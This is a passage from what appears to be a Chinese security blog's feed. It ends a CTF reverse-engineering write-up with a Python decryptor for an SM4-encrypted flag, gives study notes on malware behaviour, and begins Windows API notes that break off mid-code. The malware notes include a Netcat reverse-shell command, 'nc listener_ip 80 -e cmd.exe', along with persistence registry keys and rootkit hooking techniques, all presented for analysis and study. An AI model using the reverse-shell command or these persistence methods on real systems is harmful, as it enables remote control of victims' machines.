3C 19 E6 85 4F A8</span></div><div class="line"><span class="string">68 6B 81 B2 71 64 DA 8B F8 EB 0F 4B 70 56 9D 35</span></div><div class="line"><span class="string">1E 24 0E 5E 63 58 D1 A2 25 22 7C 3B 01 21 78 87</span></div><div class="line"><span class="string">D4 00 46 57 9F D3 27 52 4C 36 02 E7 A0 C4 C8 9E</span></div><div class="line"><span class="string">EA BF 8A D2 40 C7 38 B5 A3 F7 F2 CE F9 61 15 A1</span></div><div class="line"><span class="string">E0 AE 5D A4 9B 34 1A 55 AD 93 32 30 F5 8C B1 E3</span></div><div class="line"><span class="string">1D F6 E2 2E 82 66 CA 60 C0 29 23 AB 0D 53 4E 6F</span></div><div class="line"><span class="string">D5 DB 37 45 DE FD 8E 2F 03 FF 6A 72 6D 6C 5B 51</span></div><div class="line"><span class="string">8D 1B AF 92 BB DD BC 7F 11 D9 5C 41 1F 10 5A D8</span></div><div class="line"><span class="string">0A C1 31 88 A5 CD 7B BD 2D 74 D0 12 B8 E5 B4 B0</span></div><div class="line"><span class="string">89 69 97 4A 0C 96 77 7E 65 B9 F1 09 C5 6E C6 84</span></div><div class="line"><span class="string">18 F0 7D EC 3A DC 4D 20 79 EE 5F 3E D7 CB 39 48</span></div><div class="line"><span class="string">'''</span></div><div class="line">key=data.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">''</span>,<span class="string">''</span>)</div><div class="line">data=bytearray.fromhex(key)</div><div class="line"><span class="keyword">return</span> data[index]</div><div class="line"></div><div class="line"><span class="comment">#循环移位 k为正，左移k位，k位负，右移k位</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span><span class="params">(lst, k)</span>:</span></div><div class="line">   <span class="keyword">return</span> lst[k:] + lst[:k]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xolr</span><span class="params">(num,k)</span>:</span></div><div class="line">sum=bin(num)[<span class="number">2</span>:]</div><div class="line"><span class="keyword">if</span> len(sum)!=<span class="number">32</span>:</div><div class="line">k1=<span class="number">32</span>-len(sum)</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(k1):</div><div class="line">s=s+<span class="string">'0'</span></div><div class="line">sum=s+sum</div><div class="line">data=demo(sum,k)</div><div class="line">data=int(data,<span class="number">2</span>)</div><div class="line"><span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_re1</span><span class="params">()</span>:</span></div><div class="line">enc_flag=<span class="string">"F4 88 91 C2 9B 20 5B 03 F1 ED F6 13 46 3C 55 81 61 0F FF 14 6E 1C 48 28 79 9F 85 AF C5 58 0D D6 A5 D9 64 FD 46 09 8C DF 3B A5 37 62 5A A6 D2 4B"</span></div><div class="line">key=enc_flag.replace(<span class="string">' '</span>,<span class="string">''</span>)</div><div class="line">data1=bytearray.fromhex(key)</div><div class="line">enc_re1=[]</div><div class="line">k=<span class="number">51</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</div><div class="line">enc_re1.append(hex(data1[i]^(<span class="number">51</span>+i)))</div><div class="line"><span class="keyword">return</span> enc_re1</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_4</span><span class="params">(data)</span>:</span></div><div class="line">c=[]</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"><span class="keyword">if</span> i&gt;=<span class="number">16</span>:</div><div class="line"><span class="keyword">break</span></div><div class="line">k=data[i][<span class="number">2</span>:]+data[i+<span class="number">1</span>][<span class="number">2</span>:]+data[i+<span class="number">2</span>][<span class="number">2</span>:]+data[i+<span class="number">3</span>][<span class="number">2</span>:]</div><div class="line">c.append(k)</div><div class="line">i=i+<span class="number">4</span></div><div class="line">c1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">-1</span>,<span class="number">-1</span>):</div><div class="line">c1.append(c[i])</div><div class="line"><span class="keyword">return</span> c1</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_re</span><span class="params">(data,num)</span>:</span></div><div class="line">k=ini_juz(num)</div><div class="line">k1=int(data[<span class="number">0</span>],<span class="number">16</span>)^int(data[<span class="number">1</span>],<span class="number">16</span>)^int(data[<span class="number">2</span>],<span class="number">16</span>)^int(k,<span class="number">16</span>)</div><div class="line">k=hex(k1)</div><div class="line"><span class="keyword">if</span> len(k)==<span class="number">9</span>:</div><div class="line">k=<span class="string">'0x0'</span>+k[<span class="number">2</span>:]</div><div class="line"><span class="keyword">if</span> len(k)==<span class="number">8</span>:</div><div class="line">k=<span class="string">'0x00'</span>+k[<span class="number">2</span>:]</div><div class="line">c=[]</div><div class="line">c.append(k[<span class="number">2</span>:<span class="number">4</span>])</div><div class="line">c.append(k[<span class="number">4</span>:<span class="number">6</span>])</div><div class="line">c.append(k[<span class="number">6</span>:<span class="number">8</span>])</div><div class="line">c.append(k[<span class="number">8</span>:<span class="number">10</span>])</div><div class="line">c1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">c1.append(hex(key_juz(int(c[i],<span class="number">16</span>))))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line"><span class="keyword">if</span> len(c1[i])==<span class="number">3</span>:</div><div class="line">k1=<span class="string">'0x0'</span>+c1[i][<span class="number">2</span>:]</div><div class="line">c1[i]=k1</div><div class="line">k=c1[<span class="number">0</span>][<span class="number">2</span>:]+c1[<span class="number">1</span>][<span class="number">2</span>:]+c1[<span class="number">2</span>][<span class="number">2</span>:]+c1[<span class="number">3</span>][<span class="number">2</span>:]</div><div class="line">k1=int(k,<span class="number">16</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">-0xe</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">-0x8</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">0xa</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">0x2</span>)^int(data[<span class="number">3</span>],<span class="number">16</span>)</div><div class="line">bf=hex(k1)</div><div class="line"><span class="keyword">if</span> len(bf)!=<span class="number">10</span>:</div><div class="line">bf=<span class="string">'0x0'</span>+bf[<span class="number">2</span>:]</div><div class="line"><span class="keyword">return</span> bf[<span class="number">2</span>:]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_re</span><span class="params">(data,bf)</span>:</span></div><div class="line">data[<span class="number">3</span>]=data[<span class="number">2</span>]</div><div class="line">data[<span class="number">2</span>]=data[<span class="number">1</span>]</div><div class="line">data[<span class="number">1</span>]=data[<span class="number">0</span>]</div><div class="line">data[<span class="number">0</span>]=bf</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span><span class="params">(data,bf)</span>:</span></div><div class="line">data[<span class="number">0</span>]=data[<span class="number">1</span>]</div><div class="line">data[<span class="number">1</span>]=data[<span class="number">2</span>]</div><div class="line">data[<span class="number">2</span>]=data[<span class="number">3</span>]</div><div class="line">data[<span class="number">3</span>]=bf</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_ch</span><span class="params">(enc)</span>:</span></div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">s=s+enc[i]</div><div class="line">data=bytearray.fromhex(s)</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</div><div class="line">s=s+chr(data[i])</div><div class="line"><span class="keyword">return</span> s</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">enc=enc_re1()</div><div class="line">enc1=[]</div><div class="line">enc2=[]</div><div class="line">enc3=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line"><span class="keyword">if</span> len(enc[i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+enc[i][<span class="number">2</span>:]</div><div class="line">enc1.append(k)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">enc1.append(enc[i])</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(enc[<span class="number">16</span>+i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+enc[<span class="number">16</span>+i][<span class="number">2</span>:]</div><div class="line">enc2.append(k)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">enc2.append(enc[<span class="number">16</span>+i])</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(enc[<span class="number">32</span>+i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+enc[<span class="number">32</span>+i][<span class="number">2</span>:]</div><div class="line">enc3.append(k)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">enc3.append(enc[<span class="number">32</span>+i])</div><div class="line"></div><div class="line">data=to_4(enc1) <span class="comment">#换成enc2 enc3 即可</span></div><div class="line">num=<span class="number">124</span></div><div class="line">bf=decode_re(data,num)</div><div class="line">mov_re(data,bf)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</div><div class="line">num=num<span class="number">-4</span></div><div class="line">bf=decode_re(data,num)</div><div class="line">mov_re(data,bf)</div><div class="line">print(data)</div><div class="line">s=to_ch(data)</div><div class="line">print(s)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure><p>后来发现是国密4加密算法，想想自己对算法了解太少了，应该多多学习，不过也真正的逆了一次国密算法。今天又尝试下载python3.6(感觉还是习惯了2.7),不过3.6肯定有很大的有点，多多适应吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了一天的Re题目&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———恶意代码行为</title>
    <link href="http://yoursite.com/2018/04/30/re_16_evil_4/"/>
    <id>http://yoursite.com/2018/04/30/re_16_evil_4/</id>
    <published>2018-04-30T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:23.857Z</updated>
    
    <content type="html"><![CDATA[<p>前面都在关注恶意代码分析，很少关注恶意代码能够做什么，接下来是熟悉恶意代码最常见的行为特征。<br><a id="more"></a></p><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h2 id="下载器和启动器"><a href="#下载器和启动器" class="headerlink" title="下载器和启动器"></a>下载器和启动器</h2><p>  常见的两中恶意代码是下载器和启动器，下载器从互联网上下载其他的恶意代码，然后在本地系统中运行。下载器通常会与漏洞利用打包在一起，下载器常用Windows API函数URLDownloadtoFileA和WinExec,来下载并运行新的恶意代码。<br>  启动器(也称为加载器)是一类可执行文件，用来安装立即运行或者秘密执行的代码。启动器通常包含一个它要加载的恶意代码。</p><h2 id="后门-backdoor"><a href="#后门-backdoor" class="headerlink" title="后门(backdoor)"></a>后门(backdoor)</h2><p>  后门是另一种类型的恶意代码，它能让攻击者远程访问一个受害的机器。它们拥有许多功能，并且以多种形式与大小存在。后门代码往往实现了全套功能，所以当使用一个后门时，攻击者通常不需要下载额外的恶意代码。<br>  后门程序利用互联网的通讯方式是多样的，但是一个常用的方法是利用80端口使用http协议，http是出站流量最常使用的协议，所以它为恶意代码提供了一个与其他流量混淆的好机会。后门拥有一套通用的功能，比如操作注册表，列举窗口，创建目录，搜索文件等等。查看后门使用和导入的Windows函数，可以确定后门程序实现的功能。</p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p>  反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限，反向shell或者作为一个单独的恶意代码存在，或者作为一个复杂后门 程序的组件而存在，在反向shell中，攻击者能够如同在本地系统上运行命令一样。</p><h4 id="Netcat反向shell"><a href="#Netcat反向shell" class="headerlink" title="Netcat反向shell"></a>Netcat反向shell</h4><p>  可以通过在两台机器上运行Netcat，创建一个反向shell。同时，攻击者已经知道在恶意代码中使用Netcat,或者和其他程序一起打包使用。<br>  Netcat被作为一个反向shell使用，远程机器(攻击者)使用下列命令，等待入站连接。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -l -p</div><div class="line">-l选项设置Netcat为监听模式，-p用来设置监听端口。</div></pre></td></tr></table></figure></p><p>  受害机器会自动向外连接，并使用下列命令提供shell。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc listener_ip <span class="number">80</span> -e cmd.exe</div><div class="line">listener_ip是远程机器(攻击者)的ip地址和端口，-e选项用来指定连接建立后要运行的程序(windows系统中，最常使用cmd.exe)。</div></pre></td></tr></table></figure></p><h4 id="windwos反向shell"><a href="#windwos反向shell" class="headerlink" title="windwos反向shell"></a>windwos反向shell</h4><p>  使用cmd.exe作为windonws系统中的反向shell,有两种简单的恶意代码实现:基础方法和多线程技术<br>  基础方法:在恶意代码编写者之间比较流行。因为它容易编写，且效果与多线程技术一致，</p><h3 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a>僵尸网络</h3><p>  僵尸网络是被感染主机(僵尸主机)的一个集合。它们由单一实体控制，通常由一个称为僵尸控制器的机器作为服务器。僵尸网络的目标是尽可能多地感染机器，来构建一个更大的僵尸主机，从而是僵尸网络传播其它的恶意代码或蠕虫，或者分布式拒绝服务(DDoS)攻击。<br>  DDoS:在实施分布式拒绝服务攻击时，所有的僵尸主机会在同一时刻访问同一个站点，僵尸网络能够让这个站点挂掉。</p><h3 id="远程控制工具与僵尸网络的比较"><a href="#远程控制工具与僵尸网络的比较" class="headerlink" title="远程控制工具与僵尸网络的比较"></a>远程控制工具与僵尸网络的比较</h3><p>在远程控制工具与僵尸网络之间有些不同:<br>  1、僵尸网络感染和控制数以百万的主机。远程控制工具通常只控制很少数量的主机<br>  2、僵尸网络中的所有主机在同一时候被控制。远程控制工具是以每个受害者为单位进行远程控制，因为远程控制工具要求攻击者与受害主机之间更紧密的联系。<br>  3、远程控制工具被用来执行针对性的攻击，而僵尸网络用来进行大规模攻击。</p><h2 id="登录凭证窃密器"><a href="#登录凭证窃密器" class="headerlink" title="登录凭证窃密器"></a>登录凭证窃密器</h2><p>  攻击者经常会不遗余力地去窃取登录凭证，主要使用下面三种类型的恶意代码<br>  1、等待用户登录以窃取登录凭证的程序<br>  2、转储Windows系统中存放信息的程序，例如:密码哈希值，程序直接使用，或者对它进行离线破解。<br>  3、键盘记录器</p><h3 id="GINA-验证界面-拦截"><a href="#GINA-验证界面-拦截" class="headerlink" title="GINA(验证界面)拦截"></a>GINA(验证界面)拦截</h3><p>  在Windows xp系统中，恶意代码使用微软图像识别和验证界面(GINA)拦截技术来窃取用户的登录凭证。GINA的设计目的是让合法第三方通过添加一些代码，来自定义登录过程。恶意代码编写者利用GINA对第三方的支持来加载窃密器。<br>  GINA在msgina.dll中实现，这个dll在用户登录系统过程中由winlogon可执行文件加载。winlogon也为第三方制定实现dll程序工作，在winlogon与GINA DLL之间加载第三方(类似中间人攻击)。为了方便，windows用下列注册表项，来存储winlogon加载的第三方dll。<br>  恶意代码必须包含GINA要求的所有导出函数。具体而言，它必须导出超过15个函数，且大部分前缀是Wlx。显然，如果你分析一个dll有许多包含前缀Wlx的导出函数，那么你就有很充分的理由判定你正在分析的样本是一个GINA拦截器。</p><h3 id="口令哈希转储"><a href="#口令哈希转储" class="headerlink" title="口令哈希转储"></a>口令哈希转储</h3><p>  转储Windows口令哈希是恶意代码获取系统登录凭证的一种流行方法。攻击者试图抓取这些口令哈希，以便离线暴力破解。或者利用它们只需Pass-the-Hash攻击，这种攻击在无须破解或获取明文密码的情况下，使用LM或者NTLM哈希来通过远程主机的身份验证，从而获取访问权。</p><h2 id="存活机制"><a href="#存活机制" class="headerlink" title="存活机制"></a>存活机制</h2><p>  一旦恶意代码获取系统的控制权，它通常就会在系统中驻留很长一段时间，恶意代码的这种行为被称为存活，如果存活机制足够特别，他甚至能作为给定恶意代码的指纹</p><h3 id="windows注册表"><a href="#windows注册表" class="headerlink" title="windows注册表"></a>windows注册表</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>Sysinternals工具: 可以自动化的寻找出系统中自动启动程序。<br>ProcMon工具     : 帮助你在执行基本动态分析时，监控系统中的所有注册表修改。</p><h4 id="AppInit-dll"><a href="#AppInit-dll" class="headerlink" title="AppInit_dll"></a>AppInit_dll</h4><p>恶意代码编写者可以通过一个名为AppInit_dll特殊注册表项来让他们的dll获得加载。AppInit_dll中的dll程序会在进程加载User32.dll时被加载。插入dll路径到注册表AppInit_dll，会让dll程序获得加载机会。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost</div></pre></td></tr></table></figure></p><h4 id="Winlogon-Notify"><a href="#Winlogon-Notify" class="headerlink" title="Winlogon Notify"></a>Winlogon Notify</h4><p>恶意代码编写者可以挂钩一个特殊的winlogon事件。如登录、注销、关机等等。这<br>甚至可以允许恶意软件在安全模式下加载。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</div></pre></td></tr></table></figure></p><h3 id="特洛伊木马化-Trojanized-系统二进制文件"><a href="#特洛伊木马化-Trojanized-系统二进制文件" class="headerlink" title="特洛伊木马化(Trojanized)系统二进制文件"></a>特洛伊木马化(Trojanized)系统二进制文件</h3><p>  恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码。这些修改补丁覆盖函数的开始代码或者覆盖其他一些并不影响特洛伊木马化dll正常操作的代码。为了不影响二进制文件的正常操作，恶意的代码被加入到可执行的一个空节中。插入的代码通常用来加载恶意代码。加载恶意代码后，为了让dll的操作与插入前的代码一致，代码会跳转回原始的dll程序。</p><h3 id="dll加载顺序劫持"><a href="#dll加载顺序劫持" class="headerlink" title="dll加载顺序劫持"></a>dll加载顺序劫持</h3><p>dll加载顺序劫持是一种简单隐蔽的技术，它允许恶意代码编写者在不使用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的dll程序。<br>windows xp上加载dll的默认搜索顺序:<br>1、加载应用程序的目录<br>2、当前目录<br>3、系统目录<br>4、16位子系统的系统目录<br>5、Windows目录<br>6、path环境变量里列出的目录。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="使用SeDebugPrivilege"><a href="#使用SeDebugPrivilege" class="headerlink" title="使用SeDebugPrivilege"></a>使用SeDebugPrivilege</h3><p>以用户权限运行的进程并没有任意访问系统一切资源的权限，也不能拥有这种权限。例如在远程进程中调用类似于TerminateProcess和CreateRemoteThread函数。恶意代码获得访问这些函数的权限的唯一方法是通过设置访问令牌的权限来开启SeDebugPrivilege。<br>SeDebugPrivilege特权作为一个系统级别调试的工具被创建，但是恶意代码编写者用它来获取 系统进程拥有的所有权限(默认情况本地管理员账户才有权限)。</p><h2 id="隐藏它的踪迹-用户态的Rootkit"><a href="#隐藏它的踪迹-用户态的Rootkit" class="headerlink" title="隐藏它的踪迹-用户态的Rootkit"></a>隐藏它的踪迹-用户态的Rootkit</h2><p>常用来隐藏恶意代码行为的工具被称为Rootkit。Rootkit有多种存在形式，但是大部分Rootkit通过修改操作系统内部的功能来工作。这种修改可以为恶意代码的文件、进程、网络连接以及其他资源对其他程序隐藏。<br>一些Rootkit会修改用户态的应用程序，但是大部分会修改内核，因为保护机制都运行在内核层。</p><h3 id="IAT-Hook"><a href="#IAT-Hook" class="headerlink" title="IAT Hook"></a>IAT Hook</h3><p>IAT Hook是用户空间中一种经典的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接，这种挂钩方法是修改导入地址表(IAT)或者导出地址表(EAT)。<br>一个IAT Hook的例子如下:正常调用函数与hook函数，修改IAT<br><img src="https://i.imgur.com/kqdnGkB.png" alt=""><br>上面的路径是正常执行流，下面路径是加入Rootkit后的执行流。不过IAT Hook是一种过时且容易探测的挂钩方式，因此现在的Rootkit都使用更高级的inline Hook方法代替。</p><h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>Inline Hook是通过覆盖导入dll中API函数代码来实现的，所以它必须等到dll被加载后才能执行。IAT Hook只简单修改函数指针，但是Inline Hook将修改函数实际的函数代码。<br>恶意Rootkit通常用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行。另外，Rootkit还可以通过改变函数的代码来破坏它或者是改变它，而不是跳到恶意代码。<br>例如：一个Inline Hook函数ZwDeviceIoControlFile的例子，应用程序如Netstat,用这个函数来提取系统的网络信息。<br><img src="https://i.imgur.com/zezjh36.png" alt=""><br>现在，ZwDeviceIoControlFile会先调用Rootkit的函数，Rootkit的挂钩函数移除所有发送到目的端口443的流量以后，再调用真实的ZwDeviceIoControlFile函数，使一切操作与没有安装挂钩之前一样继续进行。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面都在关注恶意代码分析，很少关注恶意代码能够做什么，接下来是熟悉恶意代码最常见的行为特征。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———分析恶意Windows-API</title>
    <link href="http://yoursite.com/2018/04/28/re_15_evil_3/"/>
    <id>http://yoursite.com/2018/04/28/re_15_evil_3/</id>
    <published>2018-04-28T00:49:18.000Z</published>
    <updated>2018-05-15T00:35:20.607Z</updated>
    
    <content type="html"><![CDATA[<p>多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。<br><a id="more"></a></p><h1 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h1><p>Windows API是一个广泛的功能集合，管理着恶意代码与微软程序库之间的交互方式。Windows API使用特定术语，名字，已经约定。</p><h2 id="类型和匈牙利表达法"><a href="#类型和匈牙利表达法" class="headerlink" title="类型和匈牙利表达法"></a>类型和匈牙利表达法</h2><p>多数Windows API使用它自己的 名字，来表示C语言类型。Windows总体上使用匈牙利表达法，作为API函数标识符，这个表达式 使用一个前缀命名模式<br>windows API中的常见类型<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">类型和前缀                    描述</div><div class="line">WORD(w) 一个<span class="number">16</span>位的无符号数值</div><div class="line">DWORD(dw) 一个双字节，<span class="number">32</span>位的无符号数值</div><div class="line">Handles(H) 一个对象索引</div><div class="line">Long Pointer(L) 一个指向另一类型的指针</div><div class="line">Callback表示一个将会被Windows API调用的函数</div></pre></td></tr></table></figure></p><h2 id="句柄-HANDLE"><a href="#句柄-HANDLE" class="headerlink" title="句柄(HANDLE)"></a>句柄(HANDLE)</h2><p>句柄是在操作系统中被打开或被创建的项。你对句柄做的唯一的事情，就是保存它，并在后续函数调用中使用它来引用同一对象。<br>例:CreateWindowEx函数是一个句柄的简单例子。他返回一个HWND,这是一个窗口句柄。任何时候当你想要对那个窗口做些什么，比如调用DestroyWindows函数是，你就需要使用这个窗口。</p><h2 id="文件系统函数"><a href="#文件系统函数" class="headerlink" title="文件系统函数"></a>文件系统函数</h2><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件，而且独特文件名或修改为既有的文件名是明显的基于主机的感染现象。</p><h3 id="CreateFile"><a href="#CreateFile" class="headerlink" title="CreateFile"></a>CreateFile</h3><p>这个函数被用来创建和打开文件。它可以打开已经存在的文件，管道，流，以及I/O设备。还能创建新的文件。<br>函数结构体<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">LPCTSTR,lpFileName,     <span class="comment">//指向文件名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwDesiredAccess,  <span class="comment">//访问模式（读/写）  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwShareMode,       <span class="comment">//共享模式  </span></span></span></div><div class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES lpSecurityAttributes,<span class="comment">//指向安全属性的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwCreationDisposition,               <span class="comment">//如何让创建  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwFlagAndAttributes,                 <span class="comment">//文件属性  </span></span></span></div><div class="line"><span class="function"><span class="params">HANDLE hTemplateFile                       <span class="comment">//用于复制文件句柄  </span></span></span></div><div class="line">)；</div></pre></td></tr></table></figure></p><h3 id="ReadFile和WriteFile"><a href="#ReadFile和WriteFile" class="headerlink" title="ReadFile和WriteFile"></a>ReadFile和WriteFile</h3><p>这两个函数用来对文件进行读写<br>ReadFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">ReadFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">    HANDLE hFile,                                    <span class="comment">//文件的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">    LPVOID lpBuffer,                                <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span></div><div class="line"><span class="function"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span></div><div class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>WriteFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HANDLE  hFile,<span class="comment">//文件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPCVOID lpBuffer,<span class="comment">//数据缓存区指针</span></span></span></div><div class="line"><span class="function"><span class="params">DWORD   nNumberOfBytesToWrite,<span class="comment">//你要写的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">LPDWORD lpNumberOfBytesWritten,<span class="comment">//用于保存实际写入字节数的存储区域的指针</span></span></span></div><div class="line"><span class="function"><span class="params">LPOVERLAPPED lpOverlapped<span class="comment">//OVERLAPPED结构体指针</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="CreateFileMapping和MapViewofFile"><a href="#CreateFileMapping和MapViewofFile" class="headerlink" title="CreateFileMapping和MapViewofFile"></a>CreateFileMapping和MapViewofFile</h3><p>文件映射经常被恶意代码作者使用，因为它们允许讲一个文件加载到内存中，以便更加容易地进行操作。CreateFileMapping函数负责从磁盘上加载一个文件到内存。MapViewofFile函数则返回一个指向映射的基地址指针，它可以被用来访问内存中的文件。<br>CreateFileMapping函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">_In_HANDLE hFile,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPSECURITY_ATTRIBUTES lpAttributes,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD flProtect,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeHigh,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeLow,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPCTSTR lpName</span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>MapViewofFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span 